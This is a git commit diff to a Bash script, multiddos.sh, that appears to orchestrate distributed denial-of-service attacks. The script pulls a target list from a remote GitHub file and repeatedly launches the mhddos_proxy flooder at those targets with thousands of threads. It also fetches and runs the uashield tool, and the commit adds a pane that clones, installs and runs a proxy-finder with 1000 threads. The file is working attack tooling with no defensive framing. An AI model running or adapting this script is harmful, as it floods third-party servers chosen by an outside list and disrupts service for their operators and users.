10e62229c0ec71fe9587b55997c7f79934cc4cb6
ripper <mls@gmail.com>
2022-05-16 17:20:16 +0300

    add proxy finder

--- multiddos.sh
+++ multiddos.sh
@@ -17,7 +17,7 @@ typing_on_screen (){
     tput setaf 2 &>/dev/null # green
     for ((i=0; i<=${#1}; i++)); do
         printf '%s' "${1:$i:1}"
-        sleep 0.08$(( (RANDOM % 5) + 1 ))
+        sleep 0.06$(( (RANDOM % 5) + 1 ))
     done
     tput sgr0 2 &>/dev/null
 }
@@ -30,50 +30,49 @@ if [[ $docker_mode != "true" ]]; then
     uashield="off"
     vnstat="off"
     matrix="off"
+    proxy_finder="on"
 fi
 
+if [[ $t_set_manual != "on" ]]; then
+    export threads="-t 3000"
+fi
+export proxy_threads="1000"
 export methods="--http-methods GET STRESS"
 #rpc="--rpc 2000"
 #export debug="--debug"
 
 ### prepare target files (main and secondary)
 prepare_targets_and_banner () {
-export all_targets="/var/tmp/all.uaripper"
-export main_targets="/var/tmp/main.uaripper"
-export main_targets_tmp="/var/tmp/main_tmp.uaripper"
-export sec_targets="/var/tmp/secondary.uaripper"
-export sec_targets_tmp="/var/tmp/secondary_tmp.uaripper"
+export targets_curl="/var/tmp/curl.uaripper"
+export targets_line_by_line="/var/tmp/line_by_line.uaripper"
+export targets_uniq="/var/tmp/uniq.uaripper"
+export t1="/var/tmp/xaa.uaripper"
+export t2="/var/tmp/xab.uaripper"
+export t3="/var/tmp/xac.uaripper"
+export t4="/var/tmp/xad.uaripper"
 rm -f /var/tmp/*uaripper #remove previous copies
 
-# read targets from github and put them in file $all_targets. Commented and empty lines excluded.
+# read targets from github and put them in file $targets_curl. Commented and empty lines excluded.
 echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets)" | while read LINE; do
     if [[ "$LINE" != "#"* ]] && [ "$LINE" != "" ] ; then
-        echo $LINE >> $all_targets
+        echo $LINE >> $targets_curl
     fi
 done
 
-# put every line except last line in file $sec_targets
-head -n -1 $all_targets > $sec_targets
-# put only last line in file $main_targets
-tail -n 1 $all_targets > $main_targets
-
-# put all addresses in $sec_targets on a new line
-for i in $(cat $sec_targets); do
+# put all valid addresses on a new line
+for i in $(cat $targets_curl ); do
     if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
-        echo $i >> $sec_targets_tmp
+        echo $i >> $targets_line_by_line
     fi
 done
 
-# put all addresses in $main_targets on a new line
-for i in $(cat $main_targets); do
-    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
-        echo $i >> $main_targets_tmp
-    fi
-done
+# find only uniq targets, randomize order and save them in $targets_uniq
+cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
-# Check and save only uniq targets
-cat $sec_targets_tmp | sort | uniq > $sec_targets
-cat $main_targets_tmp | sort | uniq > $main_targets
+#split targets by line in N files
+cd /var/tmp/
+split -n l/2 --additional-suffix=.uaripper $targets_uniq
+cd -
 
 # Print greetings and number of targets (secondary, main, total)
 clear
@@ -81,20 +80,22 @@ toilet -t --metal "Український" && sleep 0.1
 toilet -t --metal "   жнець" && sleep 0.1
 toilet -t --metal " MULTIDDOS" && sleep 0.1
 typing_on_screen 'Шукаю завдання...'
-sleep 1
+sleep 0.5
 echo -e "\n" && sleep 0.1
-echo -e "Secondary targets:" "\x1b[32m $(cat $sec_targets | sort | uniq | wc -l)\x1b[m" && sleep 0.1
-echo -e "Main targets:     " "\x1b[32m $(cat $main_targets | sort | uniq | wc -l)\x1b[m" && sleep 0.1
-echo -e "Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq | wc -l) + $(cat $main_targets | sort | uniq | wc -l))\x1b[m" && sleep 0.1
-echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
+echo -e "Total targets found:" "\x1b[32m $(cat $targets_line_by_line | wc -l)\x1b[m" && sleep 0.1
+echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
+if [[ $threads == "" ]]; then
+    echo -e "\nКількість потоків:" "\x1b[32m $(echo "auto" | cut -d " " -f2)\x1b[m" && sleep 0.1
+else
+    echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
+fi
 echo -e "\nЗавантаження..."
-sleep 5
+sleep 3
 clear
 }
 export -f prepare_targets_and_banner
 
 launch () {
-
 # kill previous sessions or processes in case they still in memory
 tmux kill-session -t multiddos > /dev/null 2>&1
 sudo pkill node > /dev/null 2>&1
@@ -133,6 +134,11 @@ sleep 0.2
 tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
 fi
 
+if [[ $proxy_finder == "on" ]]; then
+sleep 0.2
+tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "Шукаю нові проксі... Proxy threads:" $proxy_threads; echo -e "\x1b[32mВ середньому одна робоча проксі знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py --threads $proxy_threads'
+fi
+
 #tmux -2 attach-session -d
 }
 
@@ -163,18 +169,18 @@ while [ "$1" != "" ]; do
     esac
 done
 
-#assign auto calculated threads value if it wasn't assidgned as -t in command line
-#threads = number of cores * 250
-if [[ $t_set_manual != "on" ]]; then 
-    if [[ $(nproc --all) -le 8 ]]; then
-        threads="-t $(expr $(nproc --all) "*" 250)"
-    elif [[ $(nproc --all) -gt 8 ]]; then
-        threads="-t 2000"
-    else
-        threads="-t 500" #safe value in case something go wrong
-    fi
-export threads
-fi
+# assign auto calculated threads value if it wasn't assidgned as -t in command line
+# threads = number of cores * 150
+# if [[ $t_set_manual != "on" ]]; then 
+#     if [[ $(nproc --all) -le 8 ]]; then
+#         threads="-t $(expr $(nproc --all) "*" 250)"
+#     elif [[ $(nproc --all) -gt 8 ]]; then
+#         threads="-t 1200"
+#     else
+#         threads="-t 200" #safe value in case something go wrong
+#     fi
+# export threads
+# fi
 
 prepare_targets_and_banner
 clear
@@ -197,9 +203,13 @@ git clone https://github.com/MHProDev/MHDDoS.git
 while true; do
 echo "threads: "$threads; echo "methods: "$methods
         pkill -f start.py; pkill -f runner.py 
-        python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $methods&
-        sleep 15 # to decrease load on cpu during simultaneous start
-        python3 ~/multidd/mhddos_proxy/runner.py -c $sec_targets $threads $methods&
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
+        sleep 5 # to decrease load on cpu during simultaneous start
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
+        # sleep 10 # to decrease load on cpu during simultaneous start
+        # python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
 sleep 30m
 prepare_targets_and_banner
 done
